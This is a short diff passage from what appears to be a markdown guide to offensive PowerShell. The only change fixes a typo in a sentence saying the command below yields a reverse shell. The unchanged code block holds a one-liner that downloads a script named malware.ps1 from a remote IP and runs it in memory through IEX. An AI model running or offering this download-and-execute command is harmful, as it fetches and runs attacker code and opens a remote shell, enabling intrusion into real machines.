@@ -64,7 +64,7 @@ $parsnips =
 
 ### Execution
 
-- If your execute the following command in cmd will give you reverse shell.
+- If you execute the following command in cmd will give you reverse shell.
 
 ```powershell
 echo IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.1.10:800/malware.ps1') | powershell -noprofile -
